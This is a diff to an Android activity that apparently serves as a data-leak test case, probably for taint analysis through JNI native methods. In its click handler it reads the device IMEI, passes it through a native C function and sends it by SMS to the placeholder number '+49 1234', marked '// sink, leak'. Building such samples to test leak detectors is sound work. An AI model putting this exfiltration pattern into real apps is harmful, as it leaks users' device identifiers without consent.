@@ -24,6 +24,9 @@ import android.widget.Toast;
 public class ActMain extends Activity {
 
     // ___________________
+    // C with params
+    public native String cFuncRetString(String s);
+
     // ___________________
     // C with params
     public native String cFuncModString(String s);
@@ -31,13 +34,18 @@ public class ActMain extends Activity {
     // ___________________
     @Override
     public void onCreate(Bundle savedInstanceState) {
+        Button button = (Button) findViewById(R.id.button1);
         button.setOnClickListener(new OnClickListener() {
 
             @Override
             public void onClick(View arg0) {
+                String strIMEI = "";
                 TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
                 strIMEI = telephonyManager.getDeviceId() + "foo";
                 String strOut = "";
+                strOut += "\n- cFuncModString(...):[" + cFuncModString(strIMEI) + "]";
+                Toast.makeText(ActMain.this, strOut, Toast.LENGTH_LONG).show();
+                SmsManager sms = SmsManager.getDefault();
                 // sink, leak
                 sms.sendTextMessage("+49 1234", null, strOut, null, null);
             }
